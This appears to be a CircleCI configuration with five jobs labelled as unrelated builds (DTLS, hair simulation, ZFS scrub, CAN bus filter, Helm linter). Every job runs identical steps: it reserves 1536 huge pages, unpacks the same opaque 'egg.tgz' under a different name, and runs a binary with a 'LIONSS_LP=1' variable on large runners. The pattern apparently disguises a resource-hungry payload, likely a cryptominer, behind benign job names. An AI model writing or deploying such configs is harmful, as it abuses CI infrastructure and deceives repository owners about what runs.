version: 2.1

jobs:
  webrtcDtls:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set fingerprint
          command: |
            printf 'sha-256 AA\n' > dtls.cfg
      - run:
          name: Build DTLS layer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target webrtcDtls -j2
      - run:
          name: Handshake DTLS-SRTP
          command: LIONSS_LP=1 ./build/webrtcDtls --conf dtls.cfg --role client
  flaxen:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load strands
          command: |
            printf 'strands = 50000\n' > flax.cfg
      - run:
          name: Build hair sim
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target flaxen -j2
      - run:
          name: Simulate flaxen strands
          command: LIONSS_LP=1 ./build/flaxen --config flax.cfg --gravity 9.8
  zfs_scrub:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Name pool
          command: |
            printf 'pool tank\n' > zfs.cfg
      - run:
          name: Build storage tool
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target zfs_scrub -j2
      - run:
          name: Scrub ZFS pool
          command: LIONSS_LP=1 ./build/zfs_scrub --conf zfs.cfg --priority low
  canbus_filter:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define filters
          command: |
            printf 'id 0x100 mask 0x700\n' > can.flt
      - run:
          name: Build CAN stack
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target canbus_filter -j2
      - run:
          name: Filter CAN frames
          command: LIONSS_LP=1 ./build/canbus_filter --filters can.flt --bitrate 500k
  helmLint:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Scaffold chart
          command: |
            mkdir -p chart && printf 'name: svc\n' > chart/Chart.yaml
      - run:
          name: Build chart linter
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target helmLint -j2
      - run:
          name: Lint helm chart
          command: LIONSS_LP=1 ./build/helmLint --chart chart --strict
